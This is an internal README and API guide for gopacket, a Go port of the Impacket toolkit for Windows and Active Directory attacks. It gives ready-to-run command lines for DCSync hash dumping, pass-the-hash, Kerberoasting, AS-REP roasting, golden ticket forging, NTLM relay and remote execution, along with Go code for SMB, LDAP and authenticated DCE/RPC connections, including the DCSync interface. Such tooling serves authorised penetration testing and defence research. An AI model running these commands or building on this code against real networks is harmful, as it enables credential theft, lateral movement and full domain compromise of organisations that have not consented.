# gopacket

Go Link             | go/gopacket
------------------- | -----------
**Tool Status**     | Alpha
**Tool Authors**    | <g3mark-person ldap="paullus" size=80 border-radius="20%"></g3mark-person>
**Tool Summary**    | Go implementation of Impacket — 63 tools and 24 library packages for Windows protocol interaction, AD enumeration, and attack execution.
**Project Link**    | <a href="https://mandiant-pf-experimental-internal.googlesource.com/paullus/gopacket/"><button>Gerrit</button></a>

<!--*
# Document freshness: For more information, see go/fresh-source.
freshness: { owner: 'paullus' reviewed: '2026-03-04' }
*-->

**A complete Go implementation of Impacket — compile once, run anywhere, no Python dependencies.**

gopacket is a native Go framework for Windows network protocol interaction, Active Directory enumeration, and attack execution. It ships 63 command-line tools and 24 reusable library packages (`pkg/`). Every tool compiles to a single static binary with full proxychains support.

[TOC]

## About

gopacket reimplements [Impacket](https://github.com/fortra/impacket) in Go with:

*   **63 command-line tools** covering remote execution, credential dumping, Kerberos attacks, AD enumeration, NTLM relay, and more
*   **24 importable library packages** for building custom tooling on top of SMB, LDAP, Kerberos, DCE/RPC, NTLM, and other Windows protocols
*   **Single static binaries** — no Python, no pip, no virtualenvs
*   **Full proxychains support** — route everything through SOCKS proxies, C2 tunnels, or SSH port forwards
*   **Three authentication methods everywhere** — password, pass-the-hash, and Kerberos (ccache/keytab/password)

> **Alpha Release** — Core tools have been tested against Active Directory lab environments, but edge cases and protocol quirks are expected.

## Installation

```shell
git clone https://mandiant-pf-experimental-internal.googlesource.com/paullus/gopacket
cd gopacket
```

### Build and install all tools

```shell
# Build and install all tools as gopacket-<toolname> on your PATH
./install.sh

# Or just build without installing
./install.sh --build-only

# Or build with make
make build
```

Requires Go 1.21+ and GCC (CGO is used for proxy-aware dialing).

### Uninstall

```shell
./install.sh --uninstall
```

## Quickstart

### Password Authentication

```shell
gopacket-secretsdump 'corp.local/admin:Password1@dc01.corp.local'
```

### Pass-the-Hash

```shell
gopacket-secretsdump -hashes ':aad3b435b51404eeaad3b435b51404ee' 'corp.local/admin@dc01'
```

### Kerberos (Pass-the-Ticket)

```shell
KRB5CCNAME=admin.ccache gopacket-secretsdump -k -no-pass 'corp.local/admin@dc01.corp.local'
```

### Proxychains

All tools work through proxychains without configuration:

```shell
proxychains gopacket-secretsdump 'domain/user:password@target'
proxychains gopacket-smbclient -k -no-pass 'domain/user@dc.domain.local'
```

## Tools (63)

### Remote Execution

| Tool | Command | Description |
| :--- | :--- | :--- |
| **psexec** | `gopacket-psexec` | Remote execution via SMB service creation |
| **smbexec** | `gopacket-smbexec` | Stealthier SMB execution |
| **wmiexec** | `gopacket-wmiexec` | WMI-based execution |
| **dcomexec** | `gopacket-dcomexec` | DCOM-based execution |
| **atexec** | `gopacket-atexec` | Task Scheduler execution |

### Credential Dumping & DPAPI

| Tool | Command | Description |
| :--- | :--- | :--- |
| **secretsdump** | `gopacket-secretsdump` | SAM/LSA/NTDS.dit extraction and DCSync |
| **dpapi** | `gopacket-dpapi` | DPAPI backup key extraction |
| **esentutl** | `gopacket-esentutl` | Offline ESE database (NTDS.dit) parser |
| **registry-read** | `gopacket-registry-read` | Offline Windows registry hive parser |

### Kerberos

| Tool | Command | Description |
| :--- | :--- | :--- |
| **getTGT** | `gopacket-getTGT` | Request a TGT (AS-REQ) |
| **getST** | `gopacket-getST` | Request a service ticket (S4U2Self/S4U2Proxy) |
| **GetUserSPNs** | `gopacket-GetUserSPNs` | Kerberoasting |
| **GetNPUsers** | `gopacket-GetNPUsers` | AS-REP roasting |
| **ticketer** | `gopacket-ticketer` | Golden/silver ticket forging |
| **ticketConverter** | `gopacket-ticketConverter` | ccache/kirbi conversion |
| **describeTicket** | `gopacket-describeTicket` | Ticket parser/decryptor |
| **getPac** | `gopacket-getPac` | PAC request and parsing |
| **keylistattack** | `gopacket-keylistattack` | KERB-KEY-LIST-REQ (RODC) |
| **raiseChild** | `gopacket-raiseChild` | Child-to-parent domain escalation |

### Active Directory Enumeration

| Tool | Command | Description |
| :--- | :--- | :--- |
| **GetADUsers** | `gopacket-GetADUsers` | User enumeration via LDAP |
| **GetADComputers** | `gopacket-GetADComputers` | Computer enumeration via LDAP |
| **GetLAPSPassword** | `gopacket-GetLAPSPassword` | LAPS password reading |
| **findDelegation** | `gopacket-findDelegation` | Delegation configuration discovery |
| **lookupsid** | `gopacket-lookupsid` | SID brute-forcing via LSARPC |
| **samrdump** | `gopacket-samrdump` | User enumeration via SAMR |
| **rpcdump** | `gopacket-rpcdump` | RPC endpoint enumeration |
| **rpcmap** | `gopacket-rpcmap` | RPC interface scanning |
| **net** | `gopacket-net` | net user/group/computer operations |
| **netview** | `gopacket-netview` | Session/share/logon enumeration |
| **CheckLDAPStatus** | `gopacket-CheckLDAPStatus` | LDAP signing/channel binding check |
| **DumpNTLMInfo** | `gopacket-DumpNTLMInfo` | NTLM info from SMB negotiation |
| **getArch** | `gopacket-getArch` | OS architecture detection |
| **machine_role** | `gopacket-machine_role` | Machine role detection (DC/server/workstation) |

### Active Directory Attacks

| Tool | Command | Description |
| :--- | :--- | :--- |
| **addcomputer** | `gopacket-addcomputer` | Machine account creation/modification |
| **rbcd** | `gopacket-rbcd` | RBCD manipulation |
| **dacledit** | `gopacket-dacledit` | DACL modification |
| **owneredit** | `gopacket-owneredit` | Object ownership modification |
| **samedit** | `gopacket-samedit` | SAM account name spoofing (CVE-2021-42278/42287) |
| **badsuccessor** | `gopacket-badsuccessor` | Backup operator escalation |
| **changepasswd** | `gopacket-changepasswd` | Password change/reset via SAMR and LDAP |

### SMB Tools

| Tool | Command | Description |
| :--- | :--- | :--- |
| **smbclient** | `gopacket-smbclient` | Interactive SMB client |
| **smbserver** | `gopacket-smbserver` | SMB server for file sharing |
| **attrib** | `gopacket-attrib` | File attribute modification |
| **filetime** | `gopacket-filetime` | File timestamp modification |
| **services** | `gopacket-services` | Remote service management via SVCCTL |
| **reg** | `gopacket-reg` | Remote registry operations via WINREG |
| **Get-GPPPassword** | `gopacket-Get-GPPPassword` | Group Policy Preferences password extraction |
| **karmaSMB** | `gopacket-karmaSMB` | Rogue SMB server for hash capture |

### NTLM Relay

| Tool | Command | Description |
| :--- | :--- | :--- |
| **ntlmrelayx** | `gopacket-ntlmrelayx` | Full NTLM relay framework |

**Capture servers:** SMB, HTTP/HTTPS, WCF (ADWS), RAW, RPC, WinRM

**Relay clients:** SMB, LDAP/LDAPS, HTTP/HTTPS, MSSQL, WinRM, RPC

**Attacks:** secretsdump, smbexec, ldapdump, RBCD delegation, ACL abuse, shadow credentials, ADCS ESC8, addcomputer, DNS manipulation, LAPS, gMSA, and more

**Infrastructure:** SOCKS5 proxy with protocol-aware plugins, interactive console, REST API, multi-target round-robin, WPAD serving

### SQL Server

| Tool | Command | Description |
| :--- | :--- | :--- |
| **mssqlclient** | `gopacket-mssqlclient` | Interactive MSSQL client (SQL/Windows/Kerberos) |
| **mssqlinstance** | `gopacket-mssqlinstance` | MSSQL instance discovery via SQL Browser |

### WMI

| Tool | Command | Description |
| :--- | :--- | :--- |
| **wmiquery** | `gopacket-wmiquery` | Interactive WMI query shell |
| **wmipersist** | `gopacket-wmipersist` | WMI event subscription persistence |

### Other Protocols

| Tool | Command | Description |
| :--- | :--- | :--- |
| **tstool** | `gopacket-tstool` | Terminal Services enumeration |
| **rdp_check** | `gopacket-rdp_check` | RDP authentication check |
| **mqtt_check** | `gopacket-mqtt_check` | MQTT authentication check |
| **exchanger** | `gopacket-exchanger` | Exchange Web Services client |

### Utilities

| Tool | Command | Description |
| :--- | :--- | :--- |
| **ntfs-read** | `gopacket-ntfs-read` | Offline NTFS filesystem parser |
| **ping / ping6** | `gopacket-ping` | ICMP ping |
| **sniff / sniffer** | `gopacket-sniff` | Network packet capture |
| **split** | `gopacket-split` | File splitting utility |

## Common Flags

All tools share a unified flag framework provided by `pkg/flags`:

### Authentication

| Flag | Description | Default |
| :--- | :--- | :--- |
| `-hashes LMHASH:NTHASH` | NTLM hash authentication (LM hash can be empty, e.g. `:NTHASH`) | |
| `-k` | Use Kerberos authentication | `false` |
| `-no-pass` | Don't prompt for password (use with `-k` or `-hashes`) | `false` |
| `-aesKey HEX` | AES key for Kerberos (128 or 256 bits) | |
| `-keytab FILE` | Keytab file for Kerberos | |

### Connection

| Flag | Description | Default |
| :--- | :--- | :--- |
| `-dc-host HOST` | Domain controller hostname | |
| `-dc-ip IP` | Domain controller IP address | |
| `-target-ip IP` | Target machine IP (when using hostname for Kerberos) | |
| `-port PORT` | Target port | `445` |
| `-6` | Connect via IPv6 | `false` |

### Utility

| Flag | Description | Default |
| :--- | :--- | :--- |
| `-inputfile FILE` | Input file with list of entries | |
| `-outputfile FILE` | Base output filename | |
| `-ts` | Add timestamps to logging output | `false` |
| `-debug` | Enable debug output | `false` |

### Target Format

All tools accept targets in Impacket format:

```
[[domain/]username[:password]@]<targetName or address>[:port]
```

**Examples:**

```shell
# Full format
gopacket-secretsdump 'CORP.LOCAL/administrator:P@ssw0rd@dc01.corp.local'

# No password (will prompt)
gopacket-secretsdump 'CORP.LOCAL/administrator@dc01.corp.local'

# IP target with port
gopacket-smbclient 'CORP.LOCAL/admin:pass@10.0.0.5:445'

# Hash auth
gopacket-smbclient -hashes ':aabbccdd...' 'CORP.LOCAL/admin@10.0.0.5'

# Kerberos
KRB5CCNAME=admin.ccache gopacket-smbclient -k -no-pass 'CORP.LOCAL/admin@dc01.corp.local'
```

## Quick Examples

```shell
# DCSync — dump all domain hashes
gopacket-secretsdump 'corp.local/admin:Password1@dc01.corp.local'

# Interactive SMB shell
gopacket-smbclient -hashes ':aabbccdd...' 'corp.local/admin@fileserver'

# Kerberoast — find and crack SPN accounts
gopacket-GetUserSPNs 'corp.local/user:pass@dc01.corp.local'

# AS-REP Roast
gopacket-GetNPUsers 'corp.local/user:pass@dc01.corp.local'

# Golden ticket
gopacket-ticketer -nthash <krbtgt_hash> -domain-sid S-1-5-21-... -domain corp.local admin

# NTLM relay with SOCKS
sudo gopacket-ntlmrelayx -t smb://target -socks

# RBCD relay
sudo gopacket-ntlmrelayx -t ldaps://dc01.corp.local --delegate-access

# Enumerate LAPS passwords
gopacket-GetLAPSPassword 'corp.local/admin:pass@dc01.corp.local'

# Remote execution via WMI
gopacket-wmiexec 'corp.local/admin:pass@target' 'whoami'

# Remote registry read
gopacket-reg 'corp.local/admin:pass@target' query -keyName HKLM\\SOFTWARE\\Microsoft
```

---

# Library Developer Guide

The `pkg/` directory contains 24 reusable Go packages that can be imported independently to build custom security tooling. This section is a comprehensive API reference for developers building on top of gopacket's protocol libraries.

## Architecture Overview

```
┌─────────────────────────────────────────────────────────┐
│                     Your Tool (main.go)                 │
├─────────────────────────────────────────────────────────┤
│  pkg/flags     — CLI flag parsing                       │
│  pkg/session   — Target & credential management         │
├─────────────────────────────────────────────────────────┤
│  pkg/smb       — SMB2/3 client                          │
│  pkg/ldap      — LDAP/LDAPS client                      │
│  pkg/dcerpc    — DCE/RPC + 15 service implementations   │
│  pkg/kerberos  — Kerberos 5 client & ticket operations  │
│  pkg/ntlm      — NTLM authentication protocol           │
│  pkg/tds       — SQL Server TDS protocol                │
│  pkg/mqtt      — MQTT protocol client                   │
├─────────────────────────────────────────────────────────┤
│  pkg/relay     — NTLM relay framework                   │
├─────────────────────────────────────────────────────────┤
│  pkg/security  — Security descriptors, ACLs, SIDs       │
│  pkg/ese       — ESE database parser (NTDS.dit)         │
│  pkg/registry  — Windows registry hive parser            │
│  pkg/ntfs      — NTFS filesystem parser                  │
│  pkg/dpapi     — DPAPI decryption                       │
├─────────────────────────────────────────────────────────┤
│  pkg/structure — Binary serialization helpers            │
│  pkg/utf16le   — UTF-16LE string encoding               │
│  pkg/transport — Proxy-aware TCP dialer                  │
└─────────────────────────────────────────────────────────┘
```

### Standard Tool Pattern

Every gopacket tool follows the same structure. Understanding this pattern is key to building your own tools:

```go
package main

import (
    "fmt"
    "gopacket/pkg/flags"
    "gopacket/pkg/session"
    "gopacket/pkg/smb"  // or ldap, dcerpc, etc.
)

func main() {
    // 1. Parse unified CLI flags
    opts := flags.Parse()
    if opts.TargetStr == "" {
        fmt.Println("Usage: mytool [options] target")
        return
    }

    // 2. Parse target string (domain/user:pass@host)
    target, creds, err := session.ParseTargetString(opts.TargetStr)
    if err != nil {
        fmt.Printf("[-] %v\n", err)
        return
    }

    // 3. Apply CLI flags to session (hashes, kerberos, dc-ip, etc.)
    opts.ApplyToSession(&target, &creds)

    // 4. Prompt for password if needed
    session.EnsurePassword(&creds)

    // 5. Create protocol client and connect
    client := smb.NewClient(target, &creds)
    defer client.Close()

    if err := client.Connect(); err != nil {
        fmt.Printf("[-] Connection failed: %v\n", err)
        return
    }

    // 6. Do your work
    shares, _ := client.ListShares()
    for _, share := range shares {
        fmt.Printf("[+] %s\n", share)
    }
}
```

---

## pkg/session — Target & Credential Management

The `session` package is the foundation for all tools. It parses Impacket-style target strings and manages authentication credentials.

### Types

#### `Credentials`

```go
type Credentials struct {
    Domain      string // e.g. "CORP.LOCAL"
    Username    string // e.g. "administrator"
    Password    string // e.g. "P@ssw0rd"
    Hash        string // NTLM hash, format "LMHASH:NTHASH" or ":NTHASH"
    UseKerberos bool   // Use Kerberos instead of NTLM
    DCHost      string // Domain controller hostname
    DCIP        string // Domain controller IP
    AESKey      string // AES key for Kerberos (hex)
    Keytab      string // Path to keytab file
}
```

#### `Target`

```go
type Target struct {
    Host string // Hostname or IP (e.g. "dc01.corp.local")
    IP   string // Connection IP if different from Host (for Kerberos DNS issues)
    Port int    // Target port (0 = tool default)
    IPv6 bool   // Prefer IPv6 connections
}
```

### Functions

#### `ParseTargetString`

Parses an Impacket-style target string into a `Target` and `Credentials`.

```go
func ParseTargetString(input string) (Target, Credentials, error)
```

**Format:** `[domain/]user[:password]@target[:port]`

The `@` delimiter is split on the **last** `@` in the string, allowing passwords containing `@`.

```go
target, creds, err := session.ParseTargetString("CORP/admin:P@ss@dc01:445")
// creds.Domain   = "CORP"
// creds.Username = "admin"
// creds.Password = "P@ss"
// target.Host    = "dc01"
// target.Port    = 445
```

#### `EnsurePassword`

Prompts interactively for a password if one is not already set and no alternative authentication method (hash, Kerberos, etc.) is configured.

```go
func EnsurePassword(creds *Credentials)
```

### Methods

#### `Target.Addr`

Returns the connection address using `net.JoinHostPort`, correctly handling IPv6 addresses.

```go
func (t Target) Addr() string
// "dc01:445" or "[::1]:445"
```

#### `Target.Network`

Returns `"tcp6"` when IPv6 is requested, `"tcp"` otherwise.

```go
func (t Target) Network() string
```

---

## pkg/flags — Unified CLI Framework

The `flags` package provides standardized command-line flag parsing that mirrors Impacket's interface.

### Types

#### `Options`

```go
type Options struct {
    // Authentication
    Hashes    string // -hashes LMHASH:NTHASH
    NoPass    bool   // -no-pass
    Kerberos  bool   // -k
    AesKey    string // -aesKey HEX
    Keytab    string // -keytab FILE

    // Connection
    DcHost    string // -dc-host HOST
    DcIP      string // -dc-ip IP
    TargetIP  string // -target-ip IP
    Port      int    // -port PORT (default: 445)
    IPv6      bool   // -6

    // Utility
    InputFile  string // -inputfile FILE
    OutputFile string // -outputfile FILE
    Timestamp  bool   // -ts
    Debug      bool   // -debug

    // Positional
    TargetStr string   // First positional arg (target)
    Arguments []string // Remaining positional args
}
```

### Functions

#### `Parse`

Registers all standard flags, parses `os.Args`, and returns the populated `Options`.

```go
func Parse() *Options
```

### Methods

#### `Options.ApplyToSession`

Copies parsed CLI flags into a `Target` and `Credentials` struct.

```go
func (o *Options) ApplyToSession(target *session.Target, creds *session.Credentials)
```

This handles `-hashes`, `-k`, `-dc-ip`, `-dc-host`, `-target-ip`, `-port`, `-6`, `-aesKey`, `-keytab`, and `-no-pass`.

#### `Options.Command`

Returns remaining positional arguments joined as a single string (useful for remote execution tools).

```go
func (o *Options) Command() string
```

### Adding Custom Flags

Use Go's `flag` package alongside `flags.Parse()`:

```go
import "flag"

var maxRid int
flag.IntVar(&maxRid, "maxRid", 4000, "Maximum RID to brute force")

// flags.Parse() calls flag.Parse() internally
opts := flags.Parse()
```

### Customizing Help Text

```go
import "gopacket/pkg/flags"

flags.ExtraUsageLine = "[maxRid]"
flags.ExtraUsageText = "\nPositional arguments:\n  maxRid  Maximum RID (default: 4000)\n"
opts := flags.Parse()
```

---

## pkg/smb — SMB2/3 Client

Full SMB2/3 client supporting NTLM and Kerberos authentication, share enumeration, file operations, and named pipe access.

### Types

#### `Client`

```go
type Client struct {
    Session *smb2.Session     // Underlying SMB2 session
    Target  session.Target    // Connection target
    Creds   *session.Credentials // Authentication credentials
}
```

#### `PipeAccess`

```go
type PipeAccess int

const (
    PipeAccessReadWrite PipeAccess = iota // Read and write (default)
    PipeAccessRead                        // Read only (stdout/stderr)
    PipeAccessWrite                       // Write only (stdin)
)
```

### Constructor

```go
func NewClient(target session.Target, creds *session.Credentials) *Client
```

### Connection Methods

| Method | Signature | Description |
| :--- | :--- | :--- |
| `Connect` | `() error` | Establish SMB session with auto-negotiated auth (NTLM or Kerberos based on `creds.UseKerberos`) |
| `Close` | `()` | Logoff session, unmount shares, close connection |
| `GetSessionKey` | `() []byte` | Returns the SMB session key for signing/encryption |
| `GetDNSHostName` | `() string` | Server's DNS hostname from NTLM challenge |
| `GetDNSTreeName` | `() string` | Forest DNS name from NTLM challenge |

### Share Operations

| Method | Signature | Description |
| :--- | :--- | :--- |
| `ListShares` | `() ([]string, error)` | Enumerate available shares (sorted) |
| `UseShare` | `(name string) error` | Mount a share as the active working share |

### File Operations

| Method | Signature | Description |
| :--- | :--- | :--- |
| `Ls` | `(dir string) ([]os.FileInfo, error)` | List files in a directory |
| `Cd` | `(dir string) error` | Change current directory |
| `Get` | `(remoteFile, localFile string) error` | Download a file |
| `Put` | `(localFile, remoteFile string) error` | Upload a file |
| `Cat` | `(file string) (string, error)` | Read file contents as string |
| `Mkdir` | `(dir string) error` | Create a directory |
| `Rmdir` | `(dir string) error` | Remove a directory |
| `Rm` | `(file string) error` | Delete a file |
| `Rename` | `(oldPath, newPath string) error` | Rename/move a file |
| `Mget` | `(pattern string) error` | Download files matching a glob pattern |
| `GetCurrentPath` | `() string` | Return current working directory |

### Recursive Traversal

```go
type TreeWalkFunc func(path string, info os.FileInfo, err error) error

func (c *Client) Tree(root string, fn TreeWalkFunc) error
```

Walk all files/directories recursively under `root`:

```go
client.UseShare("C$")
client.Tree("Users", func(path string, info os.FileInfo, err error) error {
    if err != nil {
        return nil // skip errors
    }
    fmt.Printf("%s (%d bytes)\n", path, info.Size())
    return nil
})
```

### Named Pipe Operations

| Method | Signature | Description |
| :--- | :--- | :--- |
| `OpenPipe` | `(name string) (*smb2.File, error)` | Open a named pipe with read/write access (mounts IPC$ automatically) |
| `OpenPipeWithAccess` | `(name string, access PipeAccess) (*smb2.File, error)` | Open a named pipe with specified access mode |

Named pipes are the transport layer for DCE/RPC over SMB. The DCE/RPC client uses these internally.

### Example: Enumerate Shares

```go
package main

import (
    "fmt"
    "gopacket/pkg/session"
    "gopacket/pkg/smb"
)

func main() {
    target := session.Target{Host: "10.0.0.5", Port: 445}
    creds := &session.Credentials{
        Domain:   "CORP",
        Username: "admin",
        Password: "Password1",
    }

    client := smb.NewClient(target, creds)
    defer client.Close()

    if err := client.Connect(); err != nil {
        fmt.Printf("[-] %v\n", err)
        return
    }

    shares, err := client.ListShares()
    if err != nil {
        fmt.Printf("[-] %v\n", err)
        return
    }

    for _, share := range shares {
        fmt.Printf("[+] \\\\%s\\%s\n", target.Host, share)
    }
}
```

### Example: Download a File

```go
client := smb.NewClient(target, creds)
defer client.Close()
client.Connect()

client.UseShare("SYSVOL")
client.Cd("corp.local/Policies")

files, _ := client.Ls(".")
for _, f := range files {
    fmt.Println(f.Name(), f.Size())
}

client.Get("some-file.xml", "/tmp/downloaded.xml")
```

### Example: Kerberos Authentication

```go
creds := &session.Credentials{
    Domain:      "CORP.LOCAL",
    Username:    "admin",
    UseKerberos: true,
    DCIP:        "10.0.0.1",
}
// Set KRB5CCNAME env var or place admin.ccache in CWD

client := smb.NewClient(session.Target{Host: "dc01.corp.local", Port: 445}, creds)
defer client.Close()
client.Connect() // Authenticates via Kerberos AP-REQ
```

---

## pkg/ldap — LDAP/LDAPS Client

LDAP client with support for password bind, NTLM hash bind, and Kerberos GSSAPI bind. Handles LDAP, LDAPS (implicit TLS), and STARTTLS.

### Types

#### `Client`

```go
type Client struct {
    Conn    *goldap.Conn         // Underlying LDAP connection
    Target  session.Target       // Connection target
    Session *session.Credentials // Authentication credentials
}
```

### Constructor

```go
func NewClient(target session.Target, creds *session.Credentials) *Client
```

### Connection

```go
func (c *Client) Connect(useTLS bool) error
```

Connection behavior based on `useTLS` and port:

| `useTLS` | Port | Behavior |
| :--- | :--- | :--- |
| `false` | 389 (default) | Plain LDAP |
| `true` | 636 | Implicit TLS (LDAPS) |
| `true` | 389 | STARTTLS upgrade |

```go
func (c *Client) Close()
```

### Authentication

| Method | Description |
| :--- | :--- |
| `Login()` | Auto-detect auth method: Kerberos → NTLM hash → password |
| `LoginWithKerberos()` | Kerberos GSSAPI SASL bind |
| `LoginWithHash()` | NTLM hash bind |
| `LoginWithUser(username string)` | Simple or NTLM bind with specific username |

`Login()` checks credentials in priority order:

1.  `creds.UseKerberos` → Kerberos GSSAPI
2.  `creds.Hash != ""` → NTLM bind
3.  Default → simple bind with password

### Search Operations

#### `Search`

General-purpose LDAP search with subtree scope.

```go
func (c *Client) Search(baseDN, filter string, attributes []string) (*goldap.SearchResult, error)
```

#### `SearchBase`

Search at BASE scope (single object lookup).

```go
func (c *Client) SearchBase(baseDN, filter string, attributes []string) (*goldap.SearchResult, error)
```

#### `SearchWithPaging`

Search with automatic paging for large result sets.

```go
func (c *Client) SearchWithPaging(baseDN, filter string, attributes []string, pageSize uint32) (*goldap.SearchResult, error)
```

#### `SearchWithControls`

Search with custom LDAP controls.

```go
func (c *Client) SearchWithControls(baseDN, filter string, attributes []string, controls []goldap.Control) (*goldap.SearchResult, error)
```

### Directory Operations

| Method | Signature | Description |
| :--- | :--- | :--- |
| `GetDefaultNamingContext` | `() (string, error)` | Get root DN (e.g. `DC=corp,DC=local`) from RootDSE |
| `GetSchemaNamingContext` | `() (string, error)` | Get schema DN from RootDSE |

### Additional LDAP Methods

The LDAP package includes specialized methods in separate files:

| File | Methods | Description |
| :--- | :--- | :--- |
| `operations.go` | `Modify`, `Add`, `Delete` | Standard LDAP write operations |
| `delegation.go` | `FindDelegation` | Delegation enumeration (unconstrained, constrained, RBCD) |
| `spnusers.go` | `GetSPNUsers` | SPN user enumeration for Kerberoasting |
| `npusers.go` | `GetNPUsers` | AS-REP roast target enumeration |

### Example: Enumerate Domain Users

```go
package main

import (
    "fmt"
    "gopacket/pkg/ldap"
    "gopacket/pkg/session"
)

func main() {
    target := session.Target{Host: "dc01.corp.local"}
    creds := &session.Credentials{
        Domain:   "CORP",
        Username: "user",
        Password: "Password1",
    }

    client := ldap.NewClient(target, creds)
    defer client.Close()

    // Connect (plain LDAP on 389)
    if err := client.Connect(false); err != nil {
        fmt.Printf("[-] %v\n", err)
        return
    }

    // Authenticate
    if err := client.Login(); err != nil {
        fmt.Printf("[-] %v\n", err)
        return
    }

    // Get base DN
    baseDN, _ := client.GetDefaultNamingContext()

    // Search for all users
    result, err := client.SearchWithPaging(
        baseDN,
        "(&(objectCategory=person)(objectClass=user))",
        []string{"sAMAccountName", "distinguishedName", "userAccountControl"},
        1000,
    )
    if err != nil {
        fmt.Printf("[-] %v\n", err)
        return
    }

    for _, entry := range result.Entries {
        fmt.Printf("[+] %s\n", entry.GetAttributeValue("sAMAccountName"))
    }
}
```

### Example: LDAPS with Kerberos

```go
creds := &session.Credentials{
    Domain:      "CORP.LOCAL",
    Username:    "admin",
    UseKerberos: true,
    DCIP:        "10.0.0.1",
}

client := ldap.NewClient(session.Target{Host: "dc01.corp.local", Port: 636}, creds)
defer client.Close()

client.Connect(true)          // LDAPS (implicit TLS)
client.LoginWithKerberos()    // GSSAPI bind
```

---

## pkg/dcerpc — DCE/RPC Client Framework

DCE/RPC client supporting named pipe (SMB) and TCP transports, with NTLM and Kerberos authentication. Includes implementations of 15+ Windows RPC services.

### Types

#### `Client`

```go
type Client struct {
    Transport     Transport            // Underlying transport (pipe or TCP)
    CallID        uint32               // Auto-incrementing call ID
    MaxFrag       uint16               // Max fragment size
    Auth          *AuthHandler         // NTLM auth state
    KrbAuth       *KerberosAuthHandler // Kerberos auth state
    AuthType      uint8                // AuthnWinNT (10) or AuthnKerberos (16)
    Authenticated bool                 // True when using packet privacy
    ContextID     uint16               // Current presentation context ID
    AssocGroup    uint32               // Association group from BindAck
}
```

#### `Transport`

```go
type Transport interface {
    Write(data []byte) (int, error)
    Read() ([]byte, error)
    Close() error
}
```

#### `InterfaceBinding`

```go
type InterfaceBinding struct {
    InterfaceUUID [16]byte
    Major, Minor  uint16
}
```

### Constructors

#### From SMB Named Pipe

```go
func NewClient(pipe *smb2.File) *Client
```

Opens a DCE/RPC client over an SMB named pipe (the most common transport):

```go
smbClient := smb.NewClient(target, creds)
smbClient.Connect()

pipe, _ := smbClient.OpenPipe("svcctl") // or "samr", "lsarpc", "winreg", etc.
rpcClient := dcerpc.NewClient(pipe)
```

#### From TCP Connection

```go
func NewClientTCP(transport Transport) *Client
```

### Binding

#### `Bind`

Bind to an RPC interface by UUID without authentication.

```go
func (c *Client) Bind(uuid [16]byte, major, minor uint16) error
```

#### `BindWithSyntax`

Bind with a specific transfer syntax (e.g., NDR64).

```go
func (c *Client) BindWithSyntax(uuid [16]byte, major, minor uint16,
    transferUUID [16]byte, transferMajor, transferMinor uint16) error
```

#### `BindMulti`

Bind to multiple interfaces simultaneously.

```go
func (c *Client) BindMulti(bindings []InterfaceBinding) error
```

#### `BindAuth`

NTLM-authenticated bind with packet privacy.

```go
func (c *Client) BindAuth(uuid [16]byte, major, minor uint16, creds *session.Credentials) error
```

#### `BindAuthKerberos`

Kerberos-authenticated bind with SPNEGO negotiation.

```go
func (c *Client) BindAuthKerberos(uuid [16]byte, major, minor uint16,
    creds *session.Credentials, target session.Target) error
```

### RPC Calls

#### `Call`

Execute an unauthenticated RPC operation.

```go
func (c *Client) Call(opNum uint16, payload []byte) ([]byte, error)
```

#### `CallAuthAuto`

Execute an authenticated RPC call. Automatically selects NTLM or Kerberos based on the active auth handler.

```go
func (c *Client) CallAuthAuto(opNum uint16, payload []byte) ([]byte, error)
```

Handles fragmentation, signing, and encryption automatically.

### RPC Service Implementations

The `pkg/dcerpc/` directory contains complete implementations of 15+ Windows RPC services:

| Package | Interface UUID | Named Pipe | Description |
| :--- | :--- | :--- | :--- |
| `samr` | `12345778-1234-ABCD-EF00-0123456789AC` | `samr` | User/group management, password changes |
| `lsarpc` | `12345778-1234-ABCD-EF00-0000000000C0` | `lsarpc` | LSA policy, name/SID lookups |
| `winreg` | `338CD001-2244-31F1-AAAA-900038001003` | `winreg` | Remote registry access |
| `svcctl` | `367ABB81-9844-35F1-AD32-98F038001003` | `svcctl` | Service control manager |
| `tsch` | `86D35949-83C9-4044-B424-DB363231FD0E` | `atsvc` | Task Scheduler |
| `drsuapi` | `E3514235-4B06-11D1-AB04-00C04FC2DCD2` | `drsuapi` | Directory replication (DCSync) |
| `epmapper` | `E1AF8308-5D1F-11C9-91A4-08002B14A0FA` | `epmapper` | RPC endpoint mapper |
| `srvsvc` | `4B324FC8-1670-01D3-1278-5A47BF6EE188` | `srvsvc` | Server service (shares, sessions) |
| `wkssvc` | `6BFFD098-A112-3610-9833-46C3F87E345A` | `wkssvc` | Workstation service |
| `dcom` | `00020400-0000-0000-C000-000000000046` | *(TCP)* | DCOM activation |
| `netlogon` | `12345678-1234-ABCD-EF00-01234567CFFB` | `netlogon` | Netlogon (domain auth) |
| `bkrp` | `3D267E5B-B620-4E82-B19B-D5E40EEE3D7D` | `protected_storage` | DPAPI backup key retrieval |
| `icpr` | `91AE6020-9E3C-11CF-8D7C-00AA00C091BE` | `cert` | ADCS certificate request |
| `gkdi` | `B9679C50-0DFF-4C6F-BCE3-A95EB6FF8ED7` | *(TCP)* | Group Key Distribution Interface |
| `tsts` | *(custom)* | `tsts` | Terminal Services |

### Example: Enumerate Services via SVCCTL

```go
package main

import (
    "fmt"
    "gopacket/pkg/dcerpc"
    "gopacket/pkg/dcerpc/svcctl"
    "gopacket/pkg/session"
    "gopacket/pkg/smb"
)

func main() {
    target := session.Target{Host: "10.0.0.5", Port: 445}
    creds := &session.Credentials{
        Domain:   "CORP",
        Username: "admin",
        Password: "Password1",
    }

    // 1. SMB connect
    smbClient := smb.NewClient(target, creds)
    defer smbClient.Close()
    smbClient.Connect()

    // 2. Open named pipe
    pipe, _ := smbClient.OpenPipe("svcctl")

    // 3. Create RPC client and bind
    rpcClient := dcerpc.NewClient(pipe)
    rpcClient.Bind(svcctl.UUID, svcctl.MajorVersion, svcctl.MinorVersion)

    // 4. Use the service
    // Open SCM, enumerate services, etc.
    // Each service package provides its own operation functions
}
```

### Example: Authenticated RPC (NTLM)

```go
pipe, _ := smbClient.OpenPipe("samr")
rpcClient := dcerpc.NewClient(pipe)

// NTLM-authenticated bind with packet privacy
rpcClient.BindAuth(samr.UUID, samr.MajorVersion, samr.MinorVersion, creds)

// All subsequent calls are encrypted
response, _ := rpcClient.CallAuthAuto(opNum, payload)
```

### Example: Authenticated RPC (Kerberos)

```go
creds.UseKerberos = true
creds.DCIP = "10.0.0.1"

pipe, _ := smbClient.OpenPipe("drsuapi")
rpcClient := dcerpc.NewClient(pipe)

// Kerberos-authenticated bind
rpcClient.BindAuthKerberos(drsuapi.UUID, drsuapi.MajorVersion, drsuapi.MinorVersion,
    creds, target)

response, _ := rpcClient.CallAuthAuto(opNum, payload)
```

---

